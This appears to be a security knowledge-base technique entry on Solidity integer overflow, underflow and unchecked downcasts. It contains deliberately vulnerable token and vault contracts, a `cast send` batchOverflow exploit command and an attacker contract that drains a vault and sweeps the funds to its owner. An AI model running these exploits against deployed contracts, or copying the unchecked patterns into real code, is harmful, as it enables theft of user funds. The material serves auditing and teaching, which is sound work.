---
title: "Integer Overflow and Underflow - Pre-0.8 Wrapping and unchecked Blocks"
category: blockchain
subcategory: arithmetic
type: technique
tags: [blockchain, integer-overflow, underflow, solidity, unchecked, safemath, evm, uint256, casting, downcast, int256, precision-loss, rounding, division, foundry, cast, arithmetic]
difficulty: easy
summary: "Before 0.8.0 arithmetic wraps silently; after 0.8.0 it still wraps inside unchecked{} and on explicit downcasts."
when_to_use:
  - "pragma is ^0.4.x / ^0.5.x / ^0.6.x / ^0.7.x with no SafeMath"
  - "You see an unchecked { } block around a subtraction or multiplication"
  - "An explicit cast like uint128(x) or uint8(x) on user input"
  - "A balance check uses subtraction before comparison"
tools: [foundry, cast, chisel, slither]
related: [reentrancy, solidity-vuln-checklist, oracle-flashloan-manipulation, bad-randomness]
---

## TL;DR

EVM arithmetic is modulo `2**256`. Solidity `>=0.8.0` inserts overflow checks that `revert`, but
`unchecked { }` opts out, and **explicit type conversions never check** in any version. Underflow
of a `uint` gives you a number near `2**256 - 1`, which is a free unlimited balance.

## Recognise it

- `pragma solidity ^0.7.6;` (or lower) and no `using SafeMath for uint256`.
- `unchecked { balances[msg.sender] -= amount; }`
- `require(balances[msg.sender] - amount >= 0)` - for a `uint` this is *always* true.
- `uint8 total = uint8(a + b);` / `uint32(block.timestamp)` / `int256(uint256Value)`.
- `balanceOf[to] += amount` in a loop, or `totalSupply += amount` with attacker-controlled amount.
- A multiplication before a division where the product can exceed `2**256`.
- Batch-transfer style: `uint256 total = count * value;` with `count` and `value` from the caller
  (the famous `batchOverflow` / `proxyOverflow` ERC20 class).
- Signed: `int256 x = type(int256).min; -x` overflows; `abs(type(int256).min)` overflows.

## Theory

### Wrap-around values

- `uint256`: range `[0, 2**256 - 1]`. `0 - 1 == 2**256 - 1 ==`
  `115792089237316195423570985008687907853269984665640564039457584007913129639935`.
- `uint8`: `255 + 1 == 0`. `uint8(256) == 0`, `uint8(257) == 1`.
- Multiplication: `a * b mod 2**256`. To make `a * b == 0` pick `a = 2**128, b = 2**128`.
- To make `count * value` small while `value` is huge:
  `value = 2**255`, `count = 2` -> `2**256 mod 2**256 == 0`.

### Explicit conversions truncate, always

```solidity
uint256 big = 2**160 + 5;
uint160 small = uint160(big);   // == 5, no revert, in EVERY solidity version
```

This is the post-0.8 gift that keeps giving: `uint128`, `uint64`, `uint32(block.timestamp)`,
`int256 -> int128`. Also `int256(uint256(x))` reinterprets bits: `uint256(2**255)` becomes
`type(int256).min`, a negative number.

### `unchecked` is contagious in gas-optimised code

Modern gas-golfed contracts wrap loop counters and known-safe maths in `unchecked`. Auditors (and
CTF authors) hide one genuinely unsafe operation in the middle.

### Division truncation / precision loss

`(a / b) * c != (a * c) / b`. Any `shares = amount * totalShares / totalAssets` with a tiny
`totalAssets` rounds to zero - the ERC4626 first-depositor inflation attack. Not an overflow, but
it lives in the same review pass.

## Attack

1. Identify the arithmetic on the path to a state variable you care about (balance, supply, cap).
2. Solve for the input that wraps: usually `amount = 2**256 - k` or `amount = 2**255`.
3. Watch for intermediate `require`s that clamp your input before the vulnerable op.
4. Fire, then read the balance to confirm the huge number.

## Code

### Vulnerable (pre-0.8)

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.7.6;

contract OldToken {
    mapping(address => uint256) public balanceOf;
    uint256 public totalSupply;

    constructor(uint256 initial) {
        balanceOf[msg.sender] = initial;
        totalSupply = initial;
    }

    // BUG: no SafeMath. `-` underflows, `+` overflows.
    function transfer(address to, uint256 amount) public returns (bool) {
        require(balanceOf[msg.sender] - amount >= 0, "insufficient"); // always true for uint
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        return true;
    }

    // BUG: classic batchOverflow -- receivers.length * value wraps
    function batchTransfer(address[] memory receivers, uint256 value) public returns (bool) {
        uint256 total = receivers.length * value;
        require(balanceOf[msg.sender] >= total, "insufficient");
        balanceOf[msg.sender] -= total;
        for (uint256 i = 0; i < receivers.length; i++) {
            balanceOf[receivers[i]] += value;
        }
        return true;
    }
}
```

Exploit for `batchTransfer`: pass two receivers and `value = 2**255`.
`2 * 2**255 == 2**256 == 0 (mod 2**256)`, so `total == 0`, the balance check passes with a zero
balance, and both receivers are credited `2**255` tokens each.

```bash
# value = 2**255
VALUE=57896044618658097711785492504343953926634992332820282019728792003956564819968
cast send "$TOKEN" "batchTransfer(address[],uint256)" "[$A,$B]" "$VALUE" \
  --rpc-url "$RPC_URL" --private-key "$PRIVATE_KEY"
cast call "$TOKEN" "balanceOf(address)(uint256)" "$A" --rpc-url "$RPC_URL"
```

Exploit for `transfer`: send 1 token from an account with 0 balance to underflow to `2**256 - 1`.

### Vulnerable (post-0.8, `unchecked` + downcast)

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

contract ModernVault {
    mapping(address => uint256) public balance;
    mapping(address => uint64)  public lockedUntil;   // downcast surface
    uint256 public totalDeposited;

    function deposit() external payable {
        balance[msg.sender] += msg.value;
        totalDeposited += msg.value;
    }

    // BUG 1: gas-golfed subtraction without a prior check
    function withdraw(uint256 amount) external {
        unchecked {
            balance[msg.sender] -= amount;     // underflows to ~2**256
        }
        (bool ok, ) = msg.sender.call{value: amount}("");
        require(ok, "send failed");
    }

    // BUG 2: silent truncation of the lock timestamp
    function lockFor(uint256 secondsFromNow) external {
        lockedUntil[msg.sender] = uint64(block.timestamp + secondsFromNow);
    }

    function isLocked(address who) public view returns (bool) {
        return lockedUntil[who] > block.timestamp;
    }

    receive() external payable {}
}
```

`withdraw(1)` with a zero balance sets `balance[msg.sender]` to `2**256 - 1` and sends you 1 wei;
then `withdraw(address(this).balance)` empties the contract while the bookkeeping still "passes".

For `lockFor`: pick `secondsFromNow = 2**64 - block.timestamp` so the sum wraps to 0 and the lock
expires immediately.

### Attacker contract

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

interface IModernVault {
    function deposit() external payable;
    function withdraw(uint256 amount) external;
    function balance(address) external view returns (uint256);
}

contract UnderflowAttacker {
    IModernVault public immutable vault;
    address public immutable owner;

    constructor(address _vault) {
        vault = IModernVault(_vault);
        owner = msg.sender;
    }

    function pwn() external {
        require(msg.sender == owner, "not owner");
        // 1) underflow our bookkeeping entry to the maximum
        vault.withdraw(1);
        require(vault.balance(address(this)) > type(uint128).max, "no underflow");
        // 2) take everything the vault actually holds
        vault.withdraw(address(vault).balance);
        (bool ok, ) = owner.call{value: address(this).balance}("");
        require(ok, "sweep failed");
    }

    receive() external payable {}
}
```

### Finding the magic input with a Foundry fuzz/solve helper

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import {Test, console2} from "forge-std/Test.sol";

contract OverflowMath is Test {
    function test_wrapValues() public pure {
        unchecked {
            assertEq(uint256(0) - 1, type(uint256).max);
            assertEq(uint256(2) * (uint256(1) << 255), 0);   // 2 * 2**255 == 0
            assertEq(uint8(255) + 1, 0);
        }
        assertEq(uint160(uint256((1 << 160) + 5)), 5);        // truncation, no unchecked needed
    }

    /// smallest `value` such that n*value wraps to exactly `target`
    function wrapTarget(uint256 n, uint256 target) public pure returns (uint256 v) {
        // requires n to be odd for a unique inverse mod 2**256
        require(n % 2 == 1, "n must be odd for modular inverse");
        uint256 inv = n;
        unchecked {
            for (uint256 i = 0; i < 8; i++) {
                inv *= 2 - n * inv;    // Newton iteration for the inverse mod 2**256
            }
            v = target * inv;
        }
    }
}
```

Quick shell arithmetic:

```bash
# 2**256 - 1
cast --max-uint
# 2**255 as decimal
python3 -c "print(2**255)"
# what does uint8(300) become?
cast --to-uint256 $(python3 -c "print(300 % 256)")
# confirm a wrap in chisel
chisel  # then: unchecked { uint8 a = 255; a += 1; a }
```

## Variants & pitfalls

- **`require(x - y >= 0)` on a `uint` is dead code** - the compiler may even warn. On 0.8+ it
  reverts on underflow, which is a DoS rather than a bypass.
- **SafeMath on some operations only**: `add` guarded, `sub` raw.
- **`uint` vs `int` comparisons**: `int256(-1) > uint256(0)` does not compile, but
  `uint256(int256(-1))` is `type(uint256).max`.
- **Array length**: pre-0.6 you could write `arr.length--` to underflow the length to `2**256 - 1`
  and then index *any* storage slot. If the pragma is `<0.6.0` and you see `length--`, that is the
  bug - combine with the array-slot formula from `storage-slot-reading` to reach slot 0.
- **Gas is the real limiter** on loops that credit `2**255` to many addresses.
- **Rounding**: `shares = assets * supply / total` with `total == 0` reverts; with `total == 1` and
  a donated balance it rounds every later depositor to zero shares (ERC4626 inflation).
- **`type(uintN).max` constants** are the cleanest way to write these in tests.
- **Detection**: `slither . --detect divide-before-multiply,unchecked-lowlevel` and grep for
  `unchecked` / `uint(8|16|32|64|128)\(`.

## Tools

- `chisel` for instant modular-arithmetic checks.
- `forge test --fuzz-runs 100000` to find the wrapping input automatically.
- `slither`, `4naly3er` for the mechanical pass.

## References

- Solidity docs: "Checked or Unchecked Arithmetic" (0.8.0 breaking changes).
- Solidity docs: "Conversions between Elementary Types" (explicit conversions truncate).
